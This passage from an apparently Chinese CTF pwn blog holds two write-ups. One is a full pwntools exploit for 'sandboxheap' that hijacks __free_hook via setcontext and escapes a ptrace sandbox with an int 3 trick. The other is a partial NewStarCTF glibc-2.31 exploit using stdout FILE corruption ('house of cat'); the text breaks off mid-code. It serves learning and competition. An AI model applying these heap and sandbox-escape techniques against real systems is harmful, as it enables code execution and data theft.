title="sandboxheap"></a>sandboxheap</h3><p>以前都是写调用prctl函数，禁止系统调用开启的沙盒题，但这题目直接使用沙盒程序来保护其它程序。</p><p>利用堆块重叠修改__free_hook到setcontext段上，释放堆块会执行setcontext段上的代码，在此过程中rdi就是被释放堆块堆块的地址，进而劫持rsp。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; disassemble setcontext<br>   <span class="hljs-number">0x00007f5b32c80085</span> &lt;+<span class="hljs-number">53</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0xa0</span>]<br>   <span class="hljs-number">0x00007f5b32c8008c</span> &lt;+<span class="hljs-number">60</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x80</span>]<br>   <span class="hljs-number">0x00007f5b32c80093</span> &lt;+<span class="hljs-number">67</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x78</span>]<br>   <span class="hljs-number">0x00007f5b32c80097</span> &lt;+<span class="hljs-number">71</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x48</span>]<br>   <span class="hljs-number">0x00007f5b32c8009b</span> &lt;+<span class="hljs-number">75</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x50</span>]<br>   <span class="hljs-number">0x00007f5b32c8009f</span> &lt;+<span class="hljs-number">79</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x58</span>]<br>   <span class="hljs-number">0x00007f5b32c800a3</span> &lt;+<span class="hljs-number">83</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x60</span>]<br>   <span class="hljs-number">0x00007f5b32c800a7</span> &lt;+<span class="hljs-number">87</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0xa8</span>]<br>   <span class="hljs-number">0x00007f5b32c800ae</span> &lt;+<span class="hljs-number">94</span>&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span><br>   <span class="hljs-number">0x00007f5b32c800af</span> &lt;+<span class="hljs-number">95</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x70</span>]<br>   <span class="hljs-number">0x00007f5b32c800b3</span> &lt;+<span class="hljs-number">99</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x88</span>]<br>   <span class="hljs-number">0x00007f5b32c800ba</span> &lt;+<span class="hljs-number">106</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x98</span>]<br>   <span class="hljs-number">0x00007f5b32c800c1</span> &lt;+<span class="hljs-number">113</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x28</span>]<br>   <span class="hljs-number">0x00007f5b32c800c5</span> &lt;+<span class="hljs-number">117</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x30</span>]<br>   <span class="hljs-number">0x00007f5b32c800c9</span> &lt;+<span class="hljs-number">121</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x68</span>]<br>   <span class="hljs-number">0x00007f5b32c800cd</span> &lt;+<span class="hljs-number">125</span>&gt;:<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x00007f5b32c800cf</span> &lt;+<span class="hljs-number">127</span>&gt;:<span class="hljs-keyword">ret</span>    <br></code></pre></td></tr></table></figure><p>最初复现时我想在堆上执行ROP将flag通过orw读出来，但是沙盒程序好像也禁用open之类的系统调用，最后看网上别的师傅写的<a href="https://mp.weixin.qq.com/s/LtC68IafiEA6rAF-cAxb0Q">wp</a>才知道需要通过<code>int 3</code>这个软中断去绕过。</p><h4 id="关于int-3的绕过"><a href="#关于int-3的绕过" class="headerlink" title="关于int 3的绕过"></a>关于int 3的绕过</h4><p>关于int 3的绕过我是看ctftime上关于Sandybox的wp，由于我英语不太好只能理解到这里了。</p><p>sandbox程序fork一个子进程，通过<strong>ptrace</strong>函数跟踪子进程。</p><p>调用ptrace(PTRACE_SYS, pid, 0, signal)使内核在子进程进入和退出系统调用时都将其暂停。</p><p>sandbox程序ida中主要的伪代码（简化）：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs smali">do&#123;<br><span class="hljs-built_in">if </span>( ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL) == -1<br>|| waitpid(v4, 0LL, 0) == -1<br>|| ptrace(PTRACE_GETREGS, v4, 0LL, v8) == -1 )<br>    &#123;<br>       break;<br>    &#125;<br>    <br>    <br>    ………………<br>    //过滤一些系统调用<br>   ………………<br>   <br>   <br>&#125;while ( ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL) != -1<br>         &amp;&amp; waitpid(v4, 0LL, 0) != -1<br>         &amp;&amp; (v10 != 10000 &amp;&amp; v10 != -1 || ptrace(PTRACE_POKEUSER, v4, 80<span class="hljs-class">LL) != -1) );</span><br></code></pre></td></tr></table></figure><ol><li>循环开头处的 ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)、waitpid(v4, 0LL, 0)是等待子进程进入系统调用；</li><li>中间的代码就是获取当前的系统调用号（rax），过滤一些系统调用；</li><li>循环结尾处的 ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)、waitpid(v4, 0LL, 0)是等待子进程离开系统调用。</li></ol><p>使用<code>int 3</code>这个软中断后，可以让父进程循环开头处的 ptrace误以为子进程已经进入系统调用，但实际上子进程并未进入系统调用；当子进程真正进入系统调用后，是触发循环结尾处的 ptrace， 事实上ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)并不能判断子进程是进入系统调用还是离开系统调用，这样就绕过了中间对系统调用的过滤。</p><p>使用int 3后：</p><ol><li>循环结尾处的 ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)、waitpid(v4, 0LL, 0)是等待子进程进入系统调用；</li><li>循环开头处的 ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)、waitpid(v4, 0LL, 0)是等待子进程离开系统调用。</li></ol><p>相当于反转了循环，之后就可以顺利执行接下来的shellcode了。</p><p>完整的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;sandboxheap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>p = process([<span class="hljs-string">&#x27;./sandbox&#x27;</span>,<span class="hljs-string">&#x27;./sandboxheap&#x27;</span>])<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">pay</span>):<br>    l = <span class="hljs-built_in">len</span>(pay)<br>    pay = <span class="hljs-built_in">int</span>.from_bytes(pay, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        a = pay &amp; <span class="hljs-number">0xff</span><br>        <span class="hljs-comment">#print(hex(a))</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            b = <span class="hljs-number">1</span> &lt;&lt; i<br>            <span class="hljs-keyword">if</span> b &amp; a == <span class="hljs-number">0</span>:<br>                result += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>            <span class="hljs-keyword">else</span> :<br>                result += <span class="hljs-string">b&#x27;\x31&#x27;</span><br>        pay = pay &gt;&gt; <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    add(i, <span class="hljs-number">0xb0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0xb8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    delete(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x80</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x18</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x80</span> + key(p64(<span class="hljs-number">0xc0</span>)) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>, payload)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br><br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-comment">#print(hex(libcbase))</span><br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>syscall_ret = libcbase + <span class="hljs-number">0xd2625</span><br>pop_rdi = libcbase + <span class="hljs-number">0x2164f</span><br>pop_rsi = libcbase + <span class="hljs-number">0x23a6a</span><br>pop_rdx = libcbase + <span class="hljs-number">0x1b96</span><br>pop_rax = libcbase + <span class="hljs-number">0x1b500</span><br>ret = libcbase + <span class="hljs-number">0x8aa</span><br><br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x820</span><br><br>payload = key(p64(free_hook))<br>edit(<span class="hljs-number">2</span>, payload)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x200</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x200</span>)<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0xa0</span> + p64(heap_addr + <span class="hljs-number">0x1140</span> + <span class="hljs-number">0x100</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(pop_rdi) + p64(heap_addr + <span class="hljs-number">0x1000</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx) + p64(<span class="hljs-number">7</span>) + p64(mprotect)<br>payload += p64(heap_addr + <span class="hljs-number">0x1350</span>)<br>edit(<span class="hljs-number">4</span>, key(payload))<br><br>shellcode = <span class="hljs-string">&#x27;int 3&#x27;</span> + shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-number">3</span>, heap_addr, <span class="hljs-number">0x30</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>, heap_addr, <span class="hljs-number">0x30</span>)<br>shellcode = asm(shellcode)<br>edit(<span class="hljs-number">5</span>, key(shellcode))<br><br>edit(<span class="hljs-number">3</span>, key(p64(setcontext + <span class="hljs-number">53</span>)))<br>p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>).encode())<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ctftime上关于Sandybox的wp：<a href="https://ctftime.org/writeup/20115">https://ctftime.org/writeup/20115</a></p><p>实际上ptrace函数还有其它更多的功能，具体请看：<a href="https://www.anquanke.com/post/id/231078">https://www.anquanke.com/post/id/231078</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 公开赛Week4 pwn 这是堆🐎</title>
    <link href="/2022/11/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9BWeek4-pwn-%E8%BF%99%E6%98%AF%E5%A0%86/"/>
    <url>/2022/11/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9BWeek4-pwn-%E8%BF%99%E6%98%AF%E5%A0%86/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF 公开赛Week4 pwn 这是堆🐎</p><p>题目环境：glibc-2.31</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先看到题目调用了prctl函数，说明开了沙盒保护机制。使用seccomp-tools检查一下</p><img src="/img/2/1667357666548.png" style="zoom: 80%;" /><p>发现题目禁止了execve的系统调用，我们很容易想到要用orw将flag读取出来；但这题还把open函数给禁用了（是不是很无语），这里我们可以系统调用openat函数去打开文件，openat函数的系统调用号为257。 </p><p>​                                                                                                     </p><p>Add函数申请堆块，Dele函数和Show函数就一句简单的puts输出。</p><p>再去看看Edit函数，对v1采用int类型去定义的，没有对负数进行检查，我们就可以利用这一点去修改除堆以外的其它地方。</p><p><img src="/img/2/1667357538953.png"></p><p>进一步查看运行时全局变量heaps在bss段的数据，发现存在IO_FILE的地址，可以输入负数然后直接修改_IO_FILE当中的值。</p><img src="/img/2/1667359698418.jpg" style="zoom: 80%;" /><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>可以使用shellcode去执行orw将flag读取出来，当然前提是泄漏堆地址，然后使用mprotect函数更改堆地址的执行权限，由于程序最初并没有给确定地址的可执行段，所以需要劫持rsp寄存器先执行mprotect函数的ROP，才能进一步去调用shellcode；或者直接劫持rsp寄存器使用open、read、write函数的ROP来实现orw。这里我采用后者。</p><p>程序中的gadget肯定是不够我们去实现ROP的，我们就使用libc中的gadget。</p><p>要控制rsp才可以去ROP，libc中可以去执行setcontext中的代码控制rsp（具体见我的Dest0g3 520迎新赛 pwn ez_kiwi这篇文章）。</p><p>我们可以去修改_IO_FILE当中的值，就想办法劫持其中的控制流，来执行setcontext。</p><h3 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h3><h5 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h5><p>这里我们就去修改标准输出<code>_IO_2_1_stdout_</code>中的值首先泄漏libc的基址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br></code></pre></td></tr></table></figure><p>然后使用ROPgadget 找到相应的gadget，<code>syscall ret</code>这个geaget可以使用操作码去寻找（如下）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROPgadget <span class="hljs-attr">--binary</span> libc-<span class="hljs-number">2.31</span><span class="hljs-selector-class">.so</span> <span class="hljs-attr">--opcode</span> <span class="hljs-string">&quot;0f05c3&quot;</span><br></code></pre></td></tr></table></figure><p>我们还要寻找：</p><p><code>0x0000000000151990 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code></p><p>setcontext中劫持rsp是通过rdx来修改的，但是在puts函数的调用中我们无法去控制rdx；使用这个gadget（它是getkeyserv_handle函数其中的一段），为我们劫持控制流提供了很好的帮助。</p><h5 id="泄漏堆地址"><a href="#泄漏堆地址" class="headerlink" title="泄漏堆地址"></a>泄漏堆地址</h5><p>存放gadget，堆是一个很好的选择，在libc中mp结构就存放了堆地址，我们就采用相同的方式去泄漏堆地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp))<br>heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br></code></pre></td></tr></table></figure><h5 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h5><p>执行puts函数，会通过找到<code>_IO_2_1_stdout_</code>的<code>_IO_file_jumps</code>中的偏移，去执行<code>_IO_file_xsputn</code>函数，我们就需要修改<code>_IO_2_1_stdout_</code>的<code>_IO_file_jumps</code>，  让其最终执行其它函数。<code>_IO_file_jumps</code> 并不能改成任意地址，在调用过程中会对其地址进行检查。</p><p>这里我采用house of cat</p><p>让其调用<code>_IO_wfile_jumps</code>中的<code>_IO_wfile_seekoff</code>函数，然后进入到<code>_IO_switch_to_wget_mode</code>函数去执行如下代码（简写）：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">4</span>&gt;     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">0xa0</span>]<br><span class="hljs-number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">15</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x20</span>]<br><span class="hljs-number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">25</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0xe0</span>]<br><span class="hljs-number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">37</span>&gt;    <span class="hljs-keyword">call</span>   <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x18</span>]<br></code></pre></td></tr></table></figure><p>劫持到_IO_wfile_jumps（如下图）</p><img src="/img/2/1667369851498.jpg" style="zoom: 67%;" /><p>_IO_switch_to_wget_mode函数中具体实现（如下图）</p><img src="/img/2/1667370258241.jpg" style="zoom: 67%;" /><p>在这过程中rdi寄存器始终是<code>_IO_2_1_stdout_</code>的地址， 让其最后执行：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">8</span>] <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>], <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">call</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span> + <span class="hljs-number">0x20</span>]<br></code></pre></td></tr></table></figure><p>通过rdi的值去控制rdx，并去执行我们指定的函数，这里我们是去执行setcontext 劫持rsp寄存器指向堆地址。</p><p>改写<code>_IO_2_1_stdout_</code>构造如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span 